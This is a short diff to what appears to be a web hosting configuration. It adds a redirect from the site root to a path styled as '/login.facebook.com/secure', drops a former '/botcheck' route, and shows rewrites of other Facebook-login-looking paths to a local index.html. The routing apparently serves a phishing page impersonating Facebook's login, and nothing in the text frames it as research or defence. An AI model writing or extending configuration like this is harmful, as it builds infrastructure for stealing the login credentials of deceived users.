@@ -1,4 +1,11 @@
 {
+  "redirects": [
+    {
+      "source": "/",
+      "destination": "/login.facebook.com/secure",
+      "permanent": false
+    }
+  ],
   "rewrites": [
     {
       "source": "/l.facebook.com/login",
@@ -11,10 +18,6 @@
     {
       "source": "/login.facebook.com/secure",
       "destination": "/index.html"
-    },
-    {
-      "source": "/",
-      "destination": "/botcheck"
     },
     {
       "source": "/facebook.com/login/verify",
